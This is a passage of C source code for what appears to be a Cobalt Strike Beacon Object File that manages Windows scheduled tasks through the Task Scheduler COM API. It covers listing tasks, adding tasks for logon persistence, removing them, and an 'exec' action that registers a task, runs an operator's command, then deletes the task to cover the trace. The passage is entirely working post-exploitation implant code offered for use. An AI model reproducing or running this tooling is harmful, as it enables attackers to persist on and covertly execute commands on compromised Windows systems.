        pService->lpVtbl->Release(pService);
        OLE32$CoUninitialize();
        return (DWORD)hr;
    }

    BSTR execPath = charToBSTR(command);
    pExecAction->lpVtbl->put_Path(pExecAction, execPath);

    BSTR execArgs = NULL;
    if (arguments != NULL && arguments[0] != '\0') {
        execArgs = charToBSTR(arguments);
        pExecAction->lpVtbl->put_Arguments(pExecAction, execArgs);
    }

    BSTR execWorkDir = NULL;
    if (workingDir != NULL && workingDir[0] != '\0') {
        execWorkDir = charToBSTR(workingDir);
        pExecAction->lpVtbl->put_WorkingDirectory(pExecAction, execWorkDir);
    }

    IRegisteredTask *pRegisteredTask = NULL;
    BSTR bStrTaskName = charToBSTR(taskName);
    hr = pRootFolder->lpVtbl->RegisterTaskDefinition(pRootFolder, bStrTaskName, pTask, TASK_CREATE_OR_UPDATE, Nullv, Nullv, TASK_LOGON_INTERACTIVE_TOKEN, Nullv, &pRegisteredTask);
    if (FAILED(hr) || pRegisteredTask == NULL) {
        BeaconPrintf(CALLBACK_ERROR, "Error registering task. Ensure you have the necessary permissions: 0x%lx\n", hr);
        pExecAction->lpVtbl->Release(pExecAction);
        pAction->lpVtbl->Release(pAction);
        pActionCollection->lpVtbl->Release(pActionCollection);
        pPrincipal->lpVtbl->Release(pPrincipal);
        pTask->lpVtbl->Release(pTask);
        pRootFolder->lpVtbl->Release(pRootFolder);
        OLEAUT32$SysFreeString(bStrTaskName);
        OLEAUT32$SysFreeString(execPath);
        if (execArgs) OLEAUT32$SysFreeString(execArgs);
        if (execWorkDir) OLEAUT32$SysFreeString(execWorkDir);
        OLEAUT32$SysFreeString(userBstr);
        OLEAUT32$SysFreeString(rootFolderPath);
        if (userStr) KERNEL32$LocalFree(userStr);
        pService->lpVtbl->Release(pService);
        OLE32$CoUninitialize();
        return (DWORD)hr;
    }
    BeaconPrintf(CALLBACK_OUTPUT, "Task \"%s\" registered (on-demand).\n", taskName);

    KERNEL32$Sleep(1500);

    IRunningTask *pRunningTask = NULL;
    HRESULT runHr = pRegisteredTask->lpVtbl->Run(pRegisteredTask, Nullv, &pRunningTask);
    if (FAILED(runHr)) {
        BeaconPrintf(CALLBACK_ERROR, "Task \"%s\" run failed: 0x%lx (will still attempt removal)\n", taskName, runHr);
    } else {
        BeaconPrintf(CALLBACK_OUTPUT, "Task \"%s\" launched: %s\n", taskName, command);
    }
    if (pRunningTask) pRunningTask->lpVtbl->Release(pRunningTask);

    KERNEL32$Sleep(1500);

    HRESULT delHr = pRootFolder->lpVtbl->DeleteTask(pRootFolder, bStrTaskName, 0);
    if (FAILED(delHr)) {
        BeaconPrintf(CALLBACK_ERROR, "Task \"%s\" removal failed: 0x%lx\n", taskName, delHr);
    } else {
        BeaconPrintf(CALLBACK_OUTPUT, "Task \"%s\" removed.\n", taskName);
    }

    pRegisteredTask->lpVtbl->Release(pRegisteredTask);
    pExecAction->lpVtbl->Release(pExecAction);
    pAction->lpVtbl->Release(pAction);
    pActionCollection->lpVtbl->Release(pActionCollection);
    pPrincipal->lpVtbl->Release(pPrincipal);
    pTask->lpVtbl->Release(pTask);
    pRootFolder->lpVtbl->Release(pRootFolder);
    pService->lpVtbl->Release(pService);
    OLEAUT32$SysFreeString(bStrTaskName);
    OLEAUT32$SysFreeString(execPath);
    if (execArgs) OLEAUT32$SysFreeString(execArgs);
    if (execWorkDir) OLEAUT32$SysFreeString(execWorkDir);
    OLEAUT32$SysFreeString(userBstr);
    OLEAUT32$SysFreeString(rootFolderPath);
    if (userStr) KERNEL32$LocalFree(userStr);
    OLE32$CoUninitialize();

    if (FAILED(hr)) return (DWORD)hr;
    if (FAILED(runHr)) return (DWORD)runHr;
    return (DWORD)delHr;
}

// Main function to parse and execute commands
void go(char *buff, int len) {
    HRESULT hr;
    char *action;
    char *taskName;
    char *cmd;
    char *args;
    char *workDir;
    char *triggerType;
    char *noElevateStr;
    BOOL noElevate;
    datap parser;

    BeaconDataParse(&parser, buff, len);

    action = BeaconDataExtract(&parser, NULL);
    taskName = BeaconDataExtract(&parser, NULL);
    cmd = BeaconDataExtract(&parser, NULL);
    args = BeaconDataExtract(&parser, NULL);
    workDir = BeaconDataExtract(&parser, NULL);
    triggerType = BeaconDataExtract(&parser, NULL);
    noElevateStr = BeaconDataExtract(&parser, NULL);
    noElevate = (noElevateStr != NULL && noElevateStr[0] == '1');

    if (action == NULL) {
        BeaconPrintf(CALLBACK_ERROR, "Error extracting data.\n");
        return;
    }

    if (MSVCRT$strcmp(action, "list") == 0) {
        hr = listTasks(taskName);
        if (FAILED(hr)) {
            BeaconPrintf(CALLBACK_ERROR, "Task list failed. Error code: 0x%lX\n", hr);
        }
        return;
    }

    if (taskName == NULL || cmd == NULL) {
        BeaconPrintf(CALLBACK_ERROR, "Error extracting data.\n");
        return;
    }

    if (triggerType == NULL || triggerType[0] == '\0') {
        triggerType = "logon";
    }

    if (MSVCRT$strcmp(action, "add") == 0) {
        hr = createTask(taskName, cmd, args, workDir, triggerType, noElevate);
        if (FAILED(hr)) {
            BeaconPrintf(CALLBACK_ERROR, "Task not created. Error code: 0x%lX\n", hr);
        }
    } else if (MSVCRT$strcmp(action, "remove") == 0) {
        hr = removeTask(taskName);
        if (FAILED(hr)) {
            BeaconPrintf(CALLBACK_ERROR, "Task not removed. Error code: 0x%lX\n", hr);
        }
    } else if (MSVCRT$strcmp(action, "exec") == 0) {
        hr = execTask(taskName, cmd, args, workDir, noElevate);
        if (FAILED(hr)) {
            BeaconPrintf(CALLBACK_ERROR, "Task exec failed. Error code: 0x%lX\n", hr);
        }
    } else {
        BeaconPrintf(CALLBACK_ERROR, "Invalid action specified.\n");
    }
}